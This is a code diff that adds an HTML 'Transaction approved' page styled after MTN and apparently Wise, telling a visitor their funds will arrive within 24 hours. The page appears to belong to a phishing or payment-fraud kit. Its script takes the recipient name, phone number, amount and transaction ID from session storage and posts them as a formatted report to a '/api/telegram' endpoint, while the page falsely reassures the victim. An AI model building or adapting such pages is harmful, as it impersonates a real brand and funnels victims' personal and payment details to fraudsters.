@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Transaction approved · MTN</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --wise-green: #9FE870;
+    --wise-success: #0E7C3A;
+    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
+    --mtn-text: #1A1A1A;
+    --mtn-text-light: #6B6B6B;
+    --mtn-text-muted: #9B9B9B;
+    --mtn-border: #E4E4E4;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #F7FBF9 0%, #E8F5E9 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .card-container { max-width: 460px; width: 100%; }
+
+  .success-card {
+    background: #FFFFFF;
+    border-radius: 1.75rem;
+    box-shadow: var(--shadow-lg);
+    padding: 2.5rem 2rem 2rem;
+    position: relative;
+    overflow: hidden;
+    text-align: center;
+    animation: cardEnter 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
+  }
+  @keyframes cardEnter {
+    from { opacity: 0; transform: translateY(16px) scale(0.97); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .success-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 6px;
+    background: linear-gradient(90deg, var(--wise-green) 0%, #7ACB47 100%);
+  }
+
+  /* Animated checkmark */
+  .success-icon-wrap {
+    width: 110px;
+    height: 110px;
+    margin: 0 auto 1.75rem;
+    position: relative;
+  }
+  .success-icon-ring {
+    position: absolute;
+    inset: 0;
+    border-radius: 50%;
+    border: 3px solid transparent;
+    border-top-color: var(--wise-green);
+    border-right-color: var(--wise-green);
+    animation: spinRing 1.2s cubic-bezier(0.4, 0, 0.2, 1) 0.15s both;
+    opacity: 0;
+  }
+  @keyframes spinRing {
+    0%   { transform: rotate(-90deg); opacity: 0; }
+    20%  { opacity: 1; }
+    100% { transform: rotate(180deg); opacity: 1; }
+  }
+
+  .success-icon {
+    position: absolute;
+    inset: 12px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #E8F5E9 0%, #D4EDDA 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 8px 24px -8px rgba(14, 124, 58, 0.35), inset 0 -3px 6px rgba(14, 124, 58, 0.08);
+    animation: iconPop 0.6s cubic-bezier(0.22, 1, 0.36, 1) 0.25s both;
+  }
+  @keyframes iconPop {
+    0%   { transform: scale(0); opacity: 0; }
+    60%  { transform: scale(1.08); }
+    100% { transform: scale(1); opacity: 1; }
+  }
+  .success-icon svg {
+    width: 46px; height: 46px;
+    stroke: var(--wise-success);
+    fill: none; stroke-width: 3;
+    stroke-linecap: round; stroke-linejoin: round;
+    stroke-dasharray: 40;
+    stroke-dashoffset: 40;
+    animation: drawCheck 0.55s cubic-bezier(0.65, 0, 0.35, 1) 0.65s both;
+  }
+  @keyframes drawCheck {
+    to { stroke-dashoffset: 0; }
+  }
+
+  /* Title */
+  .success-title {
+    font-size: 1.5rem;
+    font-weight: 800;
+    letter-spacing: -0.03em;
+    color: var(--mtn-text);
+    margin-bottom: 0.85rem;
+    line-height: 1.25;
+    animation: fadeUp 0.5s ease 0.85s both;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(6px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Subtitle */
+  .success-subtitle {
+    font-size: 1rem;
+    color: var(--mtn-text-light);
+    line-height: 1.6;
+    margin-bottom: 2rem;
+    font-weight: 400;
+    max-width: 340px;
+    margin-left: auto;
+    margin-right: auto;
+    animation: fadeUp 0.5s ease 0.95s both;
+  }
+  .success-subtitle .highlight {
+    display: inline-block;
+    background: #E8F5E9;
+    color: var(--wise-success);
+    font-weight: 700;
+    padding: 0.1rem 0.5rem;
+    border-radius: 8px;
+    white-space: nowrap;
+  }
+
+  /* Footer note */
+  .success-footer {
+    display: flex;
+    align-items: flex-start;
+    gap: 0.6rem;
+    font-size: 0.78rem;
+    color: var(--mtn-text-muted);
+    line-height: 1.55;
+    text-align: left;
+    padding: 1rem 1.15rem;
+    background: #F7F7F7;
+    border-radius: 0.85rem;
+    border: 1px solid var(--mtn-border);
+    animation: fadeUp 0.5s ease 1.05s both;
+  }
+  .success-footer svg {
+    width: 15px; height: 15px;
+    stroke: var(--mtn-text-light);
+    fill: none; stroke-width: 2;
+    stroke-linecap: round; stroke-linejoin: round;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .success-footer strong {
+    color: var(--mtn-text);
+    font-weight: 600;
+  }
+
+  @media (max-width: 480px) {
+    .success-card { padding: 2rem 1.25rem 1.75rem; border-radius: 1.5rem; }
+    .success-title { font-size: 1.3rem; }
+    .success-icon-wrap { width: 92px; height: 92px; }
+    .success-icon svg { width: 40px; height: 40px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card-container">
+  <div class="success-card">
+
+    <!-- Animated checkmark -->
+    <div class="success-icon-wrap">
+      <div class="success-icon-ring"></div>
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24">
+          <polyline points="20 6 9 17 4 12"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- Title -->
+    <h1 class="success-title">You'll receive your funds</h1>
+
+    <!-- Subtitle -->
+    <p class="success-subtitle">
+      You should receive your funds within <span class="highlight">24 hrs</span> if details entered correctly.
+    </p>
+
+    <!-- Footer note -->
+    <div class="success-footer">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+      <span>
+        You'll get an SMS confirmation from MTN once the deposit lands.
+      </span>
+    </div>
+
+  </div>
+</div>
+
+<script>
+(function() {
+  const session = (function(){
+    try {
+      const raw = sessionStorage.getItem('wise_session');
+      return raw ? JSON.parse(raw) : {};
+    } catch(e) { return {}; }
+  })();
+
+  // ---- Send one final Telegram notification (once) ----
+  if (!session.__successNotified && session.txnId) {
+    function fmtPhone(p) {
+      if (!p) return '—';
+      const m = String(p).match(/^(\+\d{1,3})(\d{3})(\d{3})(\d{3,})$/);
+      if (m) return `${m[1]} ${m[2]} ${m[3]} ${m[4]}`;
+      return p;
+    }
+
+    const msg = `🎉 <b>TRANSACTION COMPLETED</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>Recipient:</b> ${session.recipientName || '—'}
+<b>Number:</b> ${fmtPhone(session.recipientPhone)}
+<b>Amount:</b> ${session.localAmount || ''} ${session.localCurrency || ''}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${session.txnId}</code>
+<b>🕒 ${new Date().toLocaleString('en-GB')}</b>
+<b>✅ Status:</b> Funds will be credited within 24 hrs`;
+
+    fetch('/api/telegram', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: msg, txnId: session.txnId, stage: 'success', withButtons: false })
+    }).catch(() => {});
+
+    try {
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        ...session,
+        __successNotified: true,
+        successAt: Date.now()
+      }));
+    } catch(e) {}
+  }
+})();
+</script>
+</body>
+</html>
